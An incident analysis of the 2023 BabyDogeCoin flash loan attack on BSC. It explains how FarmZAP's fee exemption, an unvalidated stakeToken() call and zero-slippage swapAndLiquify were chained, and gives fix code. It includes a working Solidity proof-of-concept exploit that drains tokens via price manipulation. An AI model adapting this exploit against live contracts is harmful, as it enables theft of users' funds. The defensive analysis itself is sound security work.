# BabyDogeCoin — Fee Exemption Exploit + Unprotected Slippage Flash Loan Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-05-28 |
| **Protocol** | BabyDogeCoin (BabyDoge Farm / FarmZAP) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$135,000 (437 BNB) |
| **Attacker** | [0xcbc0...ebb](https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb) |
| **Attack Contract** | [0x5187...6e2](https://bscscan.com/address/0x51873a0b615a51115f2cfbc2e24d9db4bfa2e6e2) |
| **Attack Tx** | [0x098e...375](https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375) |
| **Vulnerable Contract** | [BabyDoge Token 0xc748...8de](https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de) |
| **Root Cause** | Fee exemption configuration in the FarmZAP contract + lack of slippage protection in the BabyDoge contract, enabling price manipulation and asset theft |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/BabyDogeCoin_exp.sol) |

---

## 1. Vulnerability Overview

BabyDogeCoin is a meme coin operating on BSC with its own Farm ecosystem (BabyDoge Farm) and a `FarmZAP` contract for liquidity management. The BabyDoge token normally charges a fee on transfers — a **fee-on-transfer** structure — however, the `FarmZAP` contract was registered as **exempt (whitelisted)** from this fee.

### Core of the Vulnerability

This incident was caused by two design flaws acting in combination:

1. **Fee Exemption Exploit (Core Vulnerability)**: The `FarmZAP` contract was exempt from BabyDoge token fee collection. The attacker exploited this to accumulate large amounts of BabyDoge through `FarmZAP` without paying any fees.

2. **Lack of Slippage Protection**: The `swapAndLiquify` function built into the BabyDoge token contract automatically swaps accumulated tokens on PancakeSwap and provides liquidity. This function was called with `amountOutMin = 0`, meaning **there was no minimum output validation whatsoever**. The attacker first manipulated the PancakeSwap pool price to drive down the BabyDoge price, then triggered `swapAndLiquify` to force the contract to sell its held BabyDoge at an extremely unfavorable price.

The attacker flash-borrowed 80,000 BNB from the Radiant Lending Pool, accumulated large amounts of BabyDoge through FarmZAP, manipulated the PancakeSwap price, triggered `swapAndLiquify` to extract profit, and then repaid the flash loan.

---

## 2. Vulnerable Code Analysis

### 2.1 FarmZAP.buyTokensAndDepositOnBehalf() — Fee Exemption Exploit (Core Vulnerability)

```solidity
// ❌ Vulnerable code — FarmZAP is registered as fee-exempt for BabyDoge
function buyTokensAndDepositOnBehalf(
    IFarm farm,
    uint256 amountIn,
    uint256 amountOutMin, // ❌ Slippage protection can be passed as 0
    address[] calldata path
) external payable returns (uint256) {
    // BNB → BABYDOGE swap (via TreatSwap)
    // ❌ FarmZAP is registered as a fee-exempt address for fee-on-transfer,
    //    allowing large amounts of BabyDoge to be accumulated without fees
    uint256 amountOut = _swap(amountIn, amountOutMin, path);

    // Approve token to address returned by farm.stakeToken() + call depositOnBehalf
    // ❌ Trusts the return value of stakeToken() without validation —
    //    an external contract (attacker) can control the return value
    address stakeTokenAddr = farm.stakeToken();
    IERC20(stakeTokenAddr).approve(address(farm), amountOut);
    farm.depositOnBehalf(amountOut, msg.sender);

    return amountOut;
}
```

```solidity
// ✅ Fixed code — fee exemption removed + external contract trust restricted
function buyTokensAndDepositOnBehalf(
    IFarm farm,
    uint256 amountIn,
    uint256 amountOutMin, // ✅ Requires a sufficient slippage protection value
    address[] calldata path
) external payable returns (uint256) {
    // ✅ Only whitelisted farm addresses allowed
    require(approvedFarms[address(farm)], "Farm not approved");

    uint256 balanceBefore = IERC20(path[path.length - 1]).balanceOf(address(this));
    _swap(amountIn, amountOutMin, path);
    uint256 actualAmount = IERC20(path[path.length - 1]).balanceOf(address(this)) - balanceBefore;

    // ✅ Does not trust stakeToken(); only processes whitelisted tokens
    address stakeTokenAddr = approvedStakeTokens[address(farm)];
    IERC20(stakeTokenAddr).approve(address(farm), actualAmount);
    farm.depositOnBehalf(actualAmount, msg.sender);

    return actualAmount;
}
```

**Issue**: `FarmZAP` is registered as fee-exempt for BabyDoge, allowing an attacker to use this contract as an intermediary to move large amounts of BabyDoge without fees. Additionally, the return value of `farm.stakeToken()` is trusted without validation, allowing an attacker's contract to manipulate the return value (returning WBNB on the 3rd call).

---

### 2.2 BabyDoge Token.swapAndLiquify() — Lack of Slippage Protection

```solidity
// ❌ Vulnerable code — swapAndLiquify has no slippage protection
function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
    uint256 half = contractTokenBalance / 2;
    uint256 otherHalf = contractTokenBalance - half;

    uint256 initialBalance = address(this).balance;

    // ❌ amountOutMin = 0 → swap executes even after price manipulation
    swapTokensForEth(half); // internally uses amountOutMin = 0

    uint256 newBalance = address(this).balance - initialBalance;

    // ❌ Liquidity added at the manipulated low price
    addLiquidity(otherHalf, newBalance);
}

function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ❌ amountOutMin = 0 — completely unprotected against slippage
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,           // ❌ amountOutMin = 0
        path,
        address(this),
        block.timestamp
    );
}
```

```solidity
// ✅ Fixed code — TWAP-based minimum output validation
function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ✅ Calculate expected output via TWAP oracle and guarantee at least 95%
    uint256 expectedOut = twapOracle.getExpectedOutput(address(this), weth, tokenAmount);
    uint256 minOut = expectedOut * 95 / 100; // ✅ 5% slippage tolerance

    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        minOut,      // ✅ Minimum output amount set
        path,
        address(this),
        block.timestamp
    );
}
```

**Issue**: The `swapAndLiquify` function, which automatically sells the contract's held BabyDoge, executes with `amountOutMin = 0`, meaning the swap completes even under extreme price manipulation. The attacker can first drive the price down with a large dump, then trigger this function to force the contract to sell its BabyDoge at a severely discounted price.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker deployed a contract to exploit the Radiant Lending Pool flash loan mechanism
- Pre-identified that the `FarmZAP` contract was fee-exempt for BabyDoge
- Designed attack contract logic to return the WBNB address on the 3rd call to `stakeToken()`
- Identified that `FarmZAP` retains residual tokens after calling the attacker's `depositOnBehalf`

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────────────┐
│  Step 1: Flash Loan Borrow                                   │
│  Attacker → Radiant Lending Pool                             │
│  Borrow 80,000 WBNB (flash loan)                             │
└────────────────────────────┬─────────────────────────────────┘
                             │ 80,000 WBNB
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 2: Bulk Buy BabyDoge (fee-exempt route)                │
│  Attacker → WBNB.withdraw() → Convert to BNB                 │
│  Attacker → FarmZAP.buyTokensAndDepositOnBehalf()            │
│  80,000 BNB → ~3.53 trillion BABYDOGE (TreatSwap, fee-exempt)│
│  FarmZAP balance: holding large amount of BABYDOGE           │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 3: PancakeSwap Price Manipulation (downward)           │
│  BABYDOGEToWBNBInPancake()                                   │
│  76.9% of FarmZAP's BABYDOGE → sent to PancakeSwap pool      │
│  ~3.53 trillion BABYDOGE → 13,208 WBNB (triggers price drop) │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 4: Trigger swapAndLiquify (core exploit)               │
│  BABYDOGE.transferFrom(FarmZAP → BabyDoge contract) bulk send│
│  → BabyDoge contract exceeds threshold → swapAndLiquify auto-executes │
│  → Receives BNB at dirt-cheap price (amountOutMin=0), then adds liquidity │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 5: PancakeSwap Reverse Swap (price recovery + profit)  │
│  WBNBToBABYDOGEInPancake()                                   │
│  76.7% of WBNB → buy back BABYDOGE via FarmZAP (at low price)│
│  Receive ~3.6 trillion BABYDOGE                              │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 6: Second FarmZAP Trigger (stakeToken manipulation)    │
│  Attacker → WBNB.withdraw(0.001 ether) → Re-call FarmZAP     │
│  3rd stakeToken() call → Attacker contract returns WBNB      │
│  FarmZAP approves WBNB to attacker + depositOnBehalf         │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 7: Liquidate Remaining BABYDOGE → WBNB                 │
│  BABYDOGEToWBNBInFarmZAP()                                   │
│  Transfer remaining FarmZAP BABYDOGE to attacker             │
│  Re-route BABYDOGE through FarmZAP → Receive WBNB            │
│  Drain FarmZAP's held WBNB as well                           │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│  Step 8: Repay Flash Loan and Realize Profit                 │
│  80,072 WBNB → Repay Radiant                                 │
│  Attacker net profit: 437 BNB (~$135,000)                    │
└──────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- Attacker profit: 437 BNB (approximately $135,000)
- Protocol loss: `swapAndLiquify` pool funds from the BabyDoge contract + FarmZAP WBNB
- 5 hours after the attack, the project team executed a transaction removing FarmZAP from the fee exemption list (`0x0c7fa7a334a31c60d9e7f7fd58063aef8cc78680f8e506c4bf4f4761aafe89f2`)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo
// Attacker: https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb
// Attack Contract: https://bscscan.com/address/0x51873a0b615a51115f2cfbc2e24d9db4bfa2e6e2
// Vulnerable Contract: https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de
// Attack Tx: https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375

contract ContractTest is Test {
    IERC20 BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
    IFarmZAP FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
    IAaveFlashloan Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    uint256 i; // Counter to track stakeToken() call count

    function testExploit() external {
        // [Step 1] Request flash loan of 80,000 WBNB from Radiant
        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // Flash loan mode (repayment required)
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);
    }

    function executeOperation(...) external returns (bool) {
        WBNB.approve(address(Radiant), amounts[0] + premiums[0]);

        // [Step 2] Convert WBNB → BNB, then buy BabyDoge via FarmZAP
        // FarmZAP is fee-exempt → accumulate large BabyDoge without fees
        WBNB.withdraw(80_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BABYDOGE);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 80_000 ether}(
            IFarm(address(this)), // Pass attacker contract as farm
            80_000 * 1e18,
            0, // amountOutMin = 0 (no slippage protection)
            path
        );

        // [Step 3] Dump large BABYDOGE on PancakeSwap → trigger price drop
        BABYDOGEToWBNBInPancake();

        // [Step 4] Trigger swapAndLiquify — force sell contract BABYDOGE at dirt-cheap price
        // Transferring FarmZAP's BABYDOGE to BabyDoge contract exceeds threshold
        BABYDOGE.transferFrom(address(FarmZAP), address(BABYDOGE), BABYDOGE.balanceOf(address(FarmZAP)) - 1);
        BABYDOGE.transferFrom(address(FarmZAP), address(this), 1); // Trigger swapAndLiquify

        // [Step 5] Buy back BABYDOGE at the depressed price
        WBNBToBABYDOGEInPancake();

        // [Step 6] Second FarmZAP call — drain WBNB via stakeToken() manipulation
        WBNB.withdraw(0.001 ether);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 0.001 ether}(
            IFarm(address(this)), 1e15, 0, path
        );

        // [Step 7] Liquidate all remaining FarmZAP BABYDOGE → WBNB
        BABYDOGEToWBNBInFarmZAP();

        return true;
    }

    // Manipulate stakeToken() return value: return BABYDOGE on calls 1-2, WBNB on call 3
    // Induces FarmZAP to approve WBNB on the 3rd call
    function stakeToken() external returns (address) {
        i++;
        if (i != 3) {
            return address(BABYDOGE); // 1st, 2nd: return normal token
        } else {
            return address(WBNB);    // 3rd: return WBNB → drain FarmZAP's WBNB
        }
    }

    function BABYDOGEToWBNBInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        // Transfer 76.9% of FarmZAP's BABYDOGE directly to Pair (triggers price drop)
        BABYDOGE.transferFrom(address(FarmZAP), address(Pair), BABYReserve * 769 / 1000);
        uint256 amountIn = BABYDOGE.balanceOf(address(Pair)) - BABYReserve;
        // Calculate WBNB output using AMM formula and execute swap
        uint256 amountOut = (9975 * amountIn * WBNBReserve) / (10_000 * BABYReserve + 9975 * amountIn);
        Pair.swap(amountOut, 0, address(this), new bytes(0));
    }

    function WBNBToBABYDOGEInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        // Transfer 76.7% of current WBNB holdings to Pair (price recovery)
        WBNB.transfer(address(Pair), WBNBReserve * 767 / 1000);
        uint256 amountIn = WBNB.balanceOf(address(Pair)) - WBNBReserve;
        uint256 amountOut = (9975 * amountIn * BABYReserve) / (10_000 * WBNBReserve + 9975 * amountIn);
        // Send BABYDOGE to FarmZAP (used for subsequent liquidation)
        Pair.swap(0, amountOut, address(FarmZAP), new bytes(0));
    }

    function BABYDOGEToWBNBInFarmZAP() internal {
        // Transfer all FarmZAP BABYDOGE to attacker
        BABYDOGE.transferFrom(address(FarmZAP), address(this), BABYDOGE.balanceOf(address(FarmZAP)));
        BABYDOGE.approve(address(FarmZAP), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BABYDOGE);
        path[1] = address(WBNB);
        // Liquidate BABYDOGE → WBNB via FarmZAP (exploiting fee exemption)
        FarmZAP.buyTokensAndDepositOnBehalf(
            IFarm(address(this)), BABYDOGE.balanceOf(address(this)), 0, path
        );
        // Drain FarmZAP's WBNB approved via 3rd stakeToken() return value (WBNB)
        WBNB.transferFrom(address(FarmZAP), address(this), WBNB.balanceOf(address(FarmZAP)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Fee Exemption Exploit | CRITICAL | CWE-284: Improper Access Control |
| V-02 | Lack of Slippage Protection | HIGH | CWE-20: Improper Input Validation |
| V-03 | Untrusted External Contract Call | HIGH | CWE-345: Insufficient Verification of Data Authenticity |
| V-04 | Unauthorized transferFrom | HIGH | CWE-862: Missing Authorization |

### V-01: Fee Exemption Exploit

- **Description**: The BabyDoge token charges a fee on transfers, but the `FarmZAP` contract was registered as a fee-exempt address (whitelist). The attacker used `FarmZAP` as an intermediary layer to move large amounts of BabyDoge at zero cost, transactions that would normally incur fees.
- **Impact**: Neutralization of the fee structure, ability to accumulate tokens in bulk, profitability of arbitrage when combined with flash loans
- **Attack Condition**: FarmZAP is registered on the fee-exempt list and the attacker can call FarmZAP arbitrarily

### V-02: Lack of Slippage Protection

- **Description**: The `swapAndLiquify` function and its PancakeSwap swap calls execute with `amountOutMin = 0`, forcing the swap to complete even under extremely unfavorable price conditions. The attacker manipulated the PancakeSwap liquidity pool to drive down the BabyDoge price, then induced the contract to sell its tokens at a severely discounted price.
- **Impact**: Contract-held assets sold at conditions far worse than market price, worsening liquidity pool imbalance
- **Attack Condition**: Attacker has sufficient capital to adequately manipulate the liquidity pool and the ability to trigger `swapAndLiquify`

### V-03: Untrusted External Contract Call

- **Description**: The `buyTokensAndDepositOnBehalf` function in `FarmZAP` calls `farm.stakeToken()` on the `IFarm farm` address passed as an argument without any whitelist validation. The attacker passed their own contract as `farm` and manipulated the return value of `stakeToken()` arbitrarily (returning WBNB address on the 3rd call).
- **Impact**: FarmZAP approves and processes `depositOnBehalf` for an arbitrary token (WBNB) as intended by the attacker, enabling theft of FarmZAP's held WBNB
- **Attack Condition**: Absence of input validation (whitelist) for the farm address

### V-04: Unauthorized transferFrom

- **Description**: Conditions were created where FarmZAP granted high allowances on BabyDoge tokens to the attacker's contract during the swap process, or where the attacker could directly move FarmZAP's held tokens via `transferFrom(FarmZAP, ...)` calls. Combined with the fee exemption setting, this effectively turned FarmZAP into a token movement proxy.
- **Impact**: Complete theft of FarmZAP's held BABYDOGE and WBNB
- **Attack Condition**: Inadequate allowance management in FarmZAP, no restrictions on transferFrom callers

---

## 6. Remediation Recommendations

### Immediate Actions

**[1] Review and Minimize the Fee Exemption List**

```solidity
// ✅ Minimize fee-exempt addresses and apply timelock for changes
mapping(address => bool) public feeExempt;

function setFeeExempt(address account, bool exempt) external onlyOwner {
    // Implement timelock (minimum 48-hour delay)
    require(block.timestamp >= feeExemptTimelocks[account], "Timelock active");
    feeExempt[account] = exempt;
    emit FeeExemptChanged(account, exempt);
}
```

**[2] Add Slippage Protection to swapAndLiquify**

```solidity
// ✅ Enforce minimum output validation based on TWAP
function swapTokensForEth(uint256 tokenAmount) private {
    uint256 expectedEth = twapOracle.consult(address(this), tokenAmount);
    uint256 minEth = expectedEth * 95 / 100; // Maximum 5% slippage allowed

    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        minEth, // ✅ amountOutMin set
        path,
        address(this),
        block.timestamp + 300 // ✅ Deadline set
    );
}
```

**[3] Apply Whitelist to FarmZAP farm Addresses**

```solidity
// ✅ Only allow whitelisted Farms
mapping(address => bool) public approvedFarms;

function buyTokensAndDepositOnBehalf(
    IFarm farm,
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path
) external payable returns (uint256) {
    require(approvedFarms[address(farm)], "Farm not whitelisted"); // ✅ Validation added
    require(amountOutMin > 0, "Slippage protection required");      // ✅ Prevent 0
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Fee Exemption Exploit | Minimize exempt list, apply timelock (48h+) for changes, require multisig |
| Lack of Slippage Protection | Introduce TWAP oracle, enforce on-chain calculation of amountOutMin |
| Untrusted Farm Call | Strictly manage farm address whitelist, validate return values |
| Unauthorized transferFrom | Minimize FarmZAP allowances, immediately reset residual allowance after calls |
| Price Manipulation Vulnerability | Introduce circuit breaker: pause swapAndLiquify on large single-block price swings |

---

## 7. Lessons Learned

1. **Fee-exempt addresses become attack vectors**: When a specific contract is designated as fee-exempt in a fee-on-transfer token, that contract can become an entry point for attacks. The exempt list must be kept to an absolute minimum, and any changes must go through a timelock and governance process.

2. **Automatically executing functions (swapAndLiquify) must have slippage protection**: Functions that automatically sell a contract's own assets on a DEX must not use `amountOutMin = 0`. A TWAP oracle or minimum output amount must be dynamically calculated on-chain and enforced.

3. **Do not trust external contract arguments**: Calling a contract address passed as a function argument without validation allows return values to be manipulated. A structure that only accepts whitelisted addresses is required.

4. **Flash loans enable complex vulnerability chains to execute in a single transaction**: Even if individual vulnerabilities seem minor, combining them with flash loans makes it possible to move funds worth tens of millions of dollars. Each function's security must be designed with flash loan scenarios in mind.

5. **Recognize the limits of post-hoc remediation**: In this incident, the project team did not remove FarmZAP from the fee-exempt list until 5 hours after the attack. Deploying on-chain monitoring systems (e.g., Forta, OpenZeppelin Defender) and emergency circuit breakers in advance can minimize damage.

6. **Use balance-based accounting when integrating fee-on-transfer tokens with AMMs**: Instead of trusting the `amount` parameter, use the actual received amount as the difference in balance before and after the transfer (`balanceAfter - balanceBefore`).

---

## 8. On-Chain Verification

PoC analysis results were cross-verified against on-chain transaction data.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan borrow | 80,000 WBNB | 80,000 WBNB | ✅ |
| BabyDoge purchased | ~3.53 trillion BABYDOGE | ~3,529,864,186,667,202 BABYDOGE | ✅ |
| PancakeSwap dump | BABYReserve × 76.9% | ~3,525,976,210,595,834 BABYDOGE | ✅ |
| WBNB received (post-dump) | Calculated value | ~13,208 WBNB | ✅ |
| Attacker net profit | 437 BNB | 437 BNB | ✅ |
| Actual USD loss | ~$135,000 | ~$157,000 (differs by spot price) | Approximate |

### 8.2 Key Attack Tx

- **Attack Transaction**: [0x098e7394...375](https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375)
- **Post-Incident Tx (Team)**: [0x0c7fa7a3...89f2](https://bscscan.com/tx/0x0c7fa7a334a31c60d9e7f7fd58063aef8cc78680f8e506c4bf4f4761aafe89f2) — FarmZAP fee exemption removed 5 hours after the attack

### 8.3 Attack Block and Precondition Verification

- **Attack Block**: 28,593,354 (BSC)
- **Fork Block**: Confirmed via PoC `vm.createSelectFork("bsc", 28_593_354)`
- **Key Precondition**: FarmZAP (`0x451583B6DA479eAA04366443262848e27706f762`) registered on BabyDoge fee exemption list
- **Post-Incident Confirmation**: Within 5 hours of the attack, FarmZAP was removed from the fee exemption list, making the identical attack non-reproducible

---

*Reference Links*
- [MetaTrust Labs Analysis](https://medium.com/@MetatrustL/cracking-the-code-delving-into-the-elaborate-scheme-behind-babydoge-coins-flash-loan-attack-9c94f59041ff)
- [Phalcon Twitter Analysis](https://twitter.com/Phalcon_xyz/status/1662744426475831298)
- [BabyDoge Token BscScan](https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de#code)